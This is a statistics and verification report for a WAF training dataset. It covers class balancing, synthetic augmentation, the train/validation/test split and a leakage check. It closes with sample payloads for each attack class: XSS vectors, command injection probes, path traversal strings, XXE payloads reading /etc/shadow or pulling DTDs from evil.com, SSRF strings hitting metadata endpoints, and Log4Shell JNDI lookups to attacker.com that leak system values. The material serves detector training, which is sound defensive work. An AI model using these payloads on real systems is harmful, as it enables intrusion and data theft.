# WAF Dataset Balance & Split Verification Report

---

## 1. Class Distribution — Before Balancing

| Label | Count | % |
|-------|-------|---|
| `normal` | 81,310 | 44.4% |
| `sqli` | 33,754 | 18.4% |
| `xss` | 11,053 | 6.0% |
| `command_injection` | 8,660 | 4.7% |
| `path_traversal` | 47,196 | 25.8% |
| `xxe` | 323 | 0.2% |
| `ssrf` | 266 | 0.1% |
| `ssti` | 511 | 0.3% |
| `log4shell` | 33 | 0.0% |
| **TOTAL** | **183,106** | 100% |


---

## 2. Class Distribution — After Balancing

| Label | Count | % |
|-------|-------|---|
| `normal` | 81,310 | 40.0% |
| `sqli` | 33,754 | 16.6% |
| `xss` | 11,053 | 5.4% |
| `command_injection` | 10,000 | 4.9% |
| `path_traversal` | 47,196 | 23.2% |
| `xxe` | 5,000 | 2.5% |
| `ssrf` | 5,000 | 2.5% |
| `ssti` | 5,000 | 2.5% |
| `log4shell` | 5,000 | 2.5% |
| **TOTAL** | **203,313** | 100% |


---

## 3. Augmented Samples Per Class

| Class | Real | Augmented | Total | Augmentation Ratio |
|-------|------|-----------|-------|-------------------|
| `normal` | 81,310 | 0 | 81,310 | - |
| `sqli` | 33,754 | 0 | 33,754 | - |
| `xss` | 11,053 | 0 | 11,053 | - |
| `command_injection` | 8,660 | 1,340 | 10,000 | 0.2x |
| `path_traversal` | 47,196 | 0 | 47,196 | - |
| `xxe` | 323 | 4,677 | 5,000 | 14.5x |
| `ssrf` | 266 | 4,734 | 5,000 | 17.8x |
| `ssti` | 511 | 4,489 | 5,000 | 8.8x |
| `log4shell` | 33 | 4,967 | 5,000 | 150.5x |

> Augmentation applied ONLY to: `command_injection`, `xxe`, `ssrf`, `ssti`, `log4shell`
> `normal` traffic: **NO synthetic data generated**

---

## 4. Duplicates Removed

- **Total duplicates removed**: 0

---

## 5. Final Label Names

| # | Label |
|---|-------|
| 1 | `normal` |
| 2 | `sqli` |
| 3 | `xss` |
| 4 | `command_injection` *(renamed from `cmdi`)* |
| 5 | `path_traversal` |
| 6 | `xxe` |
| 7 | `ssrf` |
| 8 | `ssti` |
| 9 | `log4shell` |

> Previous label `cmdi` renamed to `command_injection`. All other labels were already standard.

---

## 6. Train / Validation / Test Split

| Split | File | Rows | % |
|-------|------|------|---|
| Train | `backend/data/train.csv` | 142,323 | 70.0% |
| Validation | `backend/data/validation.csv` | 30,495 | 15.0% |
| Test | `backend/data/test.csv` | 30,495 | 15.0% |
| **Total** | | **203,313** | **100%** |

### Train split

| Label | Count | % |
|-------|-------|---|
| `normal` | 56,918 | 40.0% |
| `sqli` | 23,628 | 16.6% |
| `xss` | 7,739 | 5.4% |
| `command_injection` | 7,000 | 4.9% |
| `path_traversal` | 33,038 | 23.2% |
| `xxe` | 3,500 | 2.5% |
| `ssrf` | 3,500 | 2.5% |
| `ssti` | 3,500 | 2.5% |
| `log4shell` | 3,500 | 2.5% |


### Validation split

| Label | Count | % |
|-------|-------|---|
| `normal` | 12,196 | 40.0% |
| `sqli` | 5,063 | 16.6% |
| `xss` | 1,657 | 5.4% |
| `command_injection` | 1,500 | 4.9% |
| `path_traversal` | 7,079 | 23.2% |
| `xxe` | 750 | 2.5% |
| `ssrf` | 750 | 2.5% |
| `ssti` | 750 | 2.5% |
| `log4shell` | 750 | 2.5% |


### Test split

| Label | Count | % |
|-------|-------|---|
| `normal` | 12,196 | 40.0% |
| `sqli` | 5,063 | 16.6% |
| `xss` | 1,657 | 5.4% |
| `command_injection` | 1,500 | 4.9% |
| `path_traversal` | 7,079 | 23.2% |
| `xxe` | 750 | 2.5% |
| `ssrf` | 750 | 2.5% |
| `ssti` | 750 | 2.5% |
| `log4shell` | 750 | 2.5% |


---

## 7. Class Coverage in Every Split

| Label | In Train | In Validation | In Test |
|-------|----------|---------------|---------|
| `normal` | YES | YES | YES |
| `sqli` | YES | YES | YES |
| `xss` | YES | YES | YES |
| `command_injection` | YES | YES | YES |
| `path_traversal` | YES | YES | YES |
| `xxe` | YES | YES | YES |
| `ssrf` | YES | YES | YES |
| `ssti` | YES | YES | YES |
| `log4shell` | YES | YES | YES |


---

## 8. Data Leakage Check

| Overlap | Count | Status |
|---------|-------|--------|
| Train ∩ Validation | 0 | PASS |
| Train ∩ Test | 0 | PASS |
| Validation ∩ Test | 0 | PASS |

> **PASS** - Zero payload overlap.

---

## 9. Random Samples Per Class (10 each)

### `normal`

  1. `GET http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux)`
  2. `GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=morten&password=sINCr5Nica&nombre=Solano&apel`
  3. `GET http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux`
  4. `GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=dafoe&password=25I6La&nombre=Aldebar&apellidos`
  5. `GET http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) `
  6. `POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linu`
  7. `POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux`
  8. `GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konquer`
  9. `GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Kon`
  10. `GET http://localhost:8080/tienda1/publico/miembros.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linu`

### `sqli`

  1. `GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8537&B1A=Confirmar HTTP/1.1 User-Agent: Mozilla`
  2. `GET http://localhost:8080/tienda1/global/titulo.jsp.OLD HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Lin`
  3. `POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux`
  4. `GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=w*eidar&pwd=f4lT8Sa&remember=off&B1=Entrar HT`
  5. `modoA=insertar&precio=8650&B1=Confirmar`
  6. `POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3`
  7. `GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%27OR%27a%3D%27a HTTP/1.1 User-Agent: Mozilla/5.0 `
  8. `BACKUP DATABASE [TESTING] TO DISK = '\\10.10.10.10\file'`
  9. `id=1&nombre=Queso+Manchego&precioA=85&cantidad=61&B1=A%F1adir+al+carrito`
  10. `modo=registro&login=chihhua&password=iRi4Ar&nombre=Hebert&apellidos=Fonts+Westermeier&email=hemmings_vos%40programasalqu`

### `xss`

  1. `<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><rp id=x style="`
  2. `<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:document.vulnerable=true></o`
  3. `<body onscroll=alert(1)><br><br><br><br><br><br><br><br><br><br><br><br>`
  4. `<IMG SRC=x ontimeupdate="alert(String.fromCharCode(88,83,83))">`
  5. `<div draggable="true" contenteditable>drag me</div><menu ondrop=alert(1) contenteditable>drop here</menu>`
  6. `<style>p[foo=bar{}*{-o-link:'javascript:alert(27)'}{}*{-o-link-source:current}*{background:red}]{background:green};</sty`
  7. `ABC<div style="x:\x20expression(javascript:alert(1)">DEF`
  8. `<iframe/%00/ src=javaSCRIPT&colon;alert(1)`
  9. `<svg onLoad svg onLoad="javascript:javascript:alert(4906)"></svg onLoad>`
  10. `<form id="test" /><button form="test" formaction="javascript:javascript:alert(1)">X`

### `command_injection`

  1. `%27|echo$IFSFRPQGH$((5%2B72))$(echo$IFSFRPQGH)FRPQGH`
  2. `&echo%20KHEGEQ$((46%2B22))$(echo%20KHEGEQ)KHEGEQ//`
  3. `host=x uname -a`
  4. `&&echo$IFSYPPVOY$((46%2B66))$(echo$IFSYPPVOY)YPPVOY|`
  5. `%26echo$IFSSAEWRK$((96%2B15))$(echo$IFSSAEWRK)SAEWRK//`
  6. `%22%3Becho$IFSRPJGSG$((43%2B49))$(echo$IFSRPJGSG)RPJGSG%7C`
  7. `modo=insertar&precio=3089&B1=%7C`
  8. `%3B%20str%3D%24%28echo%20WLZIBA%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%203%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%2`
  9. `%2527%3B%20str%3D%24%28echo%20OOYLLH%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%205%20-ne%20%24%7Bstr1%7D%20%5D%3B%20t`
  10. `%22%3Becho$IFSBYDVLH$((40%2B59))$(echo$IFSBYDVLH)BYDVLH%26`

### `path_traversal`

  1. `../../../../../etc/httpd/logs/acces_log%00`
  2. `.%2e0x5c.%2e0x5c.%2e0x5c.%2e0x5cetc0x5cpasswd`
  3. `/..///..///..///{FILE}`
  4. `../../../../../../../../../../../../../../../../../../www/logs/proftpd.system.log`
  5. `C:\Program Files\WindowsApps\microsoft.oneconnect_5.2006.1691.0_neutral_split.scale-100_8wekyb3d8bbwe\appxblockmap.xml`
  6. `../../../../../../../../../../../../var/log/apache/access_log%00`
  7. `..../%c1%af..../%c1%afetc%c1%afissue`
  8. `%%32%%65%%32%%650x2fboot.ini`
  9. `/etc/ggi/libggi.conf`
  10. `/etc/ncat.conf`

### `xxe`

  1. `<?xml version="1.0"?><!DOCTYPE lolz [<!foo646 lol "lol"><!foo646 foo646 "&lol;&lol;&lol;&lol;">]><lolz>&foo646;</lolz>`
  2. `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!xxe997 xxe997 SYSTEM "file:///etc/shadow%00">]><foo>&xxe997;</foo`
  3. `<?xml version="1.0"?><!DOCTYPE root [<!external346 external346 SYSTEM "/etc/shadow">]><root>&external346;</root>`
  4. `<?xml version="1.0"?><!DOCTYPE data [<!secret840 secret840 SYSTEM "expect://id">]><data>&secret840;</data>`
  5. `<?xml version="1.0"?><!DOCTYPE root [<!secret303 % remote SYSTEM "http://evil.com/evil.dtd">%remote;]><root/>`
  6. `<?xml version="1.0"?><!DOCTYPE foo [<!xxe295 xxe295 SYSTEM "php://filter/convert.base64-encode/resource=/etc/hostname">]`
  7. `<?xml version="1.0"?><!DOCTYPE foo [<!bar337 bar337 SYSTEM "netdoc:///proc/version%00">]><foo>&bar337;</foo>`
  8. `<!DOCTYPE foo [<!xxe23 xxe23 PUBLIC "-//ATT//DTD//EN" "http://evil.com/evil.dtd">]><foo>&xxe23;</foo>`
  9. `<!DOCTYPE foo [<!foo247 foo247 PUBLIC "-//ATT//DTD//EN" "http://evil.com/evil.dtd">]><foo>&foo247;</foo>`
  10. `<?xml version="1.0"?><!DOCTYPE foo [<!evil264 evil264 SYSTEM "php://filter/convert.base64-encode/resource=/proc/self/env`

### `ssrf`

  1. `url=ftp://[::1]:8080/computeMetadata/v1/`
  2. `dest=http://fe80::1/admin`
  3. `GET /?src=jar://127.1:8080/health HTTP/1.1`
  4. `GET /?dest=sftp://metadata.google.internal:389/proc/self/environ HTTP/1.1`
  5. `dict://169.254.169.254/etc/passwd`
  6. `u=dict://10.0.0.1:80/proc/self/environ`
  7. `GET /?open=netdoc://10.0.0.1:1389/latest/meta-data/ HTTP/1.1`
  8. `GET /?link=http://127.0.0.1:1099/admin/config HTTP/1.1`
  9. `gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo`
  10. `dest=https://10.0.0.1/latest/meta-data/`

### `ssti`

  1. `{{b*20}}`
  2. `${val*3}`
  3. `{{r*44}}`
  4. `{{% set r=23*23 %}}{{r}}`
  5. `@(num*22)`
  6. `#foreach($z in [1..34])${z}#end`
  7. `{{y*41}}`
  8. `{{this.push (lookup string.sub "constructor")}}`
  9. `${num*23}`
  10. `#foreach($tmp in [1..19])${tmp}#end`

### `log4shell`

  1. `${${::-j}${::-n}di:rmi://oast.me:9999/rce}`
  2. `${${upper:j}ndi:rmi://attacker.com:1389/pwn}`
  3. `X-Forwarded-For: ${jndi:ldap://attacker.com:8080/rce}`
  4. `Accept-Language: ${jndi:rmi://burpcollab.net:9999/test}`
  5. `${${upper:j}ndi:rmi://burpcollab.net:443/pwn}`
  6. `${jndi:rmi://oast.me:4444/${sys:user.name}}`
  7. `${jndi:corba://interact.sh:443/${env:interact.shNAME}}`
  8. `${jndi:ldaps://burpcollab.net:443/rce}`
  9. `${${::-j}${::-n}di:ldap://callback.net:1099/pwn}`
  10. `X-Forwarded-For: ${jndi:ldaps://oast.me:1389/x}`


